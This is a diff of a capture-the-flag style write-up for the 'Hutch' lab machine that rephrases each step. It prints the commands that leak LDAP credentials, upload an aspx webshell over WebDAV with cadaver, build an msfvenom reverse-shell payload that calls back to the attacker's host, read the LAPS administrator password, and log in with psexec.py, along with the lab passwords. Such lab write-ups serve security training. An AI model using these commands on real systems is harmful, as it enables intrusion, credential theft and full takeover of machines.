@@ -12,19 +12,19 @@ IP: 192.168.142.122
 
 
 # Resolution summary
-- Found domain of ldap to be hutch.offsec
-- Utilized ldapsearch to find username and password
-- Utilized found credentials to login with cadevar tool
+- discovered that the ldap domain is hutch.offsec
+- Used ldapsearch to obtain the password and username
+- Used the found login information to access the Cadevar tool
 - Found port 80 was running Microsoft IIS
-- Downloaded aspx webshell onto target machine in cadaver
-- Navigated to webshell page in web browser and found to have command execution
-- Googled root directory location in Microsoft IIS 10.0
+- Downloaded the aspx webshell on the cadaver target machine.
+- Used a web browser to navigate to a webshell page and discovered command execution
+- Googled Microsoft IIS 10.0's root directory location
 - Downloaded reverse shell in cadaver
-- Utilizing webshell command execuation I confirmed the reverse shell was downloaded in the root directory
+- Utilizing webshell command execution I confirmed the reverse shell was downloaded in the root directory
 - Started netcat listener on kali machine
 - Executed the reverse shell and received a reverse shelll
-- FInd Local Administrator Password Solution (LAPS) is installed onto target machine
-- Perform ldapsearch query and find administrators password
+- Found Local Administrator Password Solution (LAPS) is installed on the target machine
+- Performed ldapsearch query and found the administrators password
 - Login as administrator utilizing psexec.py and receive a session running as nt authority/system
 
 ## Improved skills
@@ -214,39 +214,30 @@ Enumerated top 200 UDP ports:
 ```
 
 ---
-
-# Enumeration
 ## Port 389/ 3268- LDAP
 
-#### -Typed "nmap -n -sV -Pn --script "ldap* and not brute" 192.168.142.122" and found the domain of ldap to be hutch.offsec
+- To further enumerate the LDAP service, the command nmap -n -sV -Pn - script "ldap* and not brute" 192.168.142.122 was executed, revealing the domain "hutch.offsec" associated with LDAP.
 
 ![](Images/Pasted%20image%2020221019004447.png)
-#LDAPenumeration
 
-#### -Typed "ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.142.122" "(objectclass=*)"" to enumerate the LDAP service:
+A subsequent LDAP search (ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.142.122" "(objectclass=*)") provided additional information, including a user named Freddy McsSorley (account name: fmcsorley) with the password "CrabSharkJellyfish192."
 
 ![](Images/Pasted%20image%2020221019005210.png)
-#LDAPsearch
-
-#### -Per the ldap enumeration script we find user Freddy McsSorley (account name fmcsorley) with password "CrabSharkJellyfish192":
 
 ![](Images/Pasted%20image%2020221019005459.png)
 
 ![](Images/Pasted%20image%2020221019005630.png)
 
-#### -Typed "cadaver http://192.168.142.122 " and user fmcsorley with password CrabSharkJellyfish192:
+## Port 80 - Microsoft IIS httpd 10.0
+Using the discovered credentials, the cadaver tool was able to establish a connection to the target machine (cadaver http://192.168.142.122). A webshell (cmdasp.aspx) was then uploaded to the target machine using the put command. The webshell could be accessed at http://192.168.142.122/cmdasp.aspx, allowing command execution on the target.
 
 ![](Images/Pasted%20image%2020221019005929.png)
-![](Images/Pasted%20image%2020221019010137.png)
-#Cadaver
 
-#### -Typed "put /usr/share/webshells/asp/cmdasp.aspx" and navigated to "http://192.168.142.122/cmdasp.aspx" and find the following web page showing the cmdasp.asp file successfully downloaded to the target machine and was able to run commands:
+![](Images/Pasted%20image%2020221019010137.png)
 
 ![](Images/Pasted%20image%2020221019010408.png)
 
 ![](Images/Pasted%20image%2020221019010645.png)
-
-## Port 80 - Microsoft IIS httpd 10.0
 
 ![](Images/Pasted%20image%2020221019010904.png)
 #aspxcmdWebShell
@@ -255,31 +246,28 @@ Enumerated top 200 UDP ports:
 ---
 
 # Exploitation
-## Name of the technique
-## aspx CMD WebShell
+##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell
 
-#### -Googled "Microsoft-IIS/10.10 root directory"
+To gain a reverse shell, the root directory for Microsoft IIS 10.0 was determined through online research. Using msfvenom, a reverse shell payload was created: msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe.
 
 ![](Images/Pasted%20image%2020221019011200.png)
 #Microsoft-IIS/10.0RootDirectory
 
-#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe"
-
 ![](Images/Pasted%20image%2020221019011410.png)
 
-#### -Typed "updog -p 80" on kali machine to host the reverse shell payload
+The payload was hosted on our Kali machine by typing "updog -p 80"
 
-#### -Typed "put /home/brian/Downloads/Proving_Grounds/Hutch/reverse.exe" on the cadaver session to download the reverse shell to target machine:
+- The payload is then uploaded to the root web server by entering the following command into the cadaver tool.
+
+put [path where payload is located]/reverse.exe
 
 ![](Images/Pasted%20image%2020221019011613.png)
 
-#### -Typed "dir C:\inetpub\wwwroot\" to confirm the reverse shell payload was on the target machine
-
+- To verify that the reverse shell payload was on the target machine, we type "dir C:\inetpub\wwwroot".
+  
 ![](Images/Pasted%20image%2020221019011821.png)
 
-#### -Ran a netcat listener on port 593 on kali machine
-
-#### -Typed "C:\inetpub\wwwroot\reverse.exe" on the webshell and received a reverse shell:
+A netcat listener was started on the Kali machine (nc -lvp 593), and the reverse shell was executed by running C:\inetpub\wwwroot\reverse.exe through the webshell. This resulted in a successful reverse shell connection.
 
 ![](Images/Pasted%20image%2020221019012059.png)
 
@@ -288,7 +276,7 @@ Enumerated top 200 UDP ports:
 # Privilege Escalation
 ## Local Enumeration
 
-#### -Navigated to "c:\Program Files" directory and shows that Microsoft's _Local Administrator Password Solution (LAPS) is installed:
+During local enumeration, it was discovered that Microsoft's Local Administrator Password Solution (LAPS) was installed in the C:\Program Files directory.
 
 ![](Images/Pasted%20image%2020221019012502.png)
 
@@ -297,13 +285,13 @@ Enumerated top 200 UDP ports:
 
 
 ## Privilege Escalation vector
-## Locate administrator password by performing an ldapsearch query and login as administrator utilizing psexec.py
+Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py
 
-#### -I attempt to query LDAP for the local administrator password by typing "ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd" and find administrators password is ",G4$4Yk-2n&x(]":
+To escalate privileges, an LDAP search was performed to retrieve the local administrator password: ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd. The search revealed the administrator password as ",G4$4Yk-2n&x(]".
 
 ![](Images/Pasted%20image%2020221019012818.png)
 
-#### - Now that I have valid administrator credentials I login with psexec.py by typing "python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122" and receive a shell as nt authority\system:
+Using the obtained administrator credentials, privilege escalation was achieved by logging in with psexec.py as the administrator: python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122. This provided a shell running as nt authority\system.
 
 ![](Images/Pasted%20image%2020221019012951.png)
 
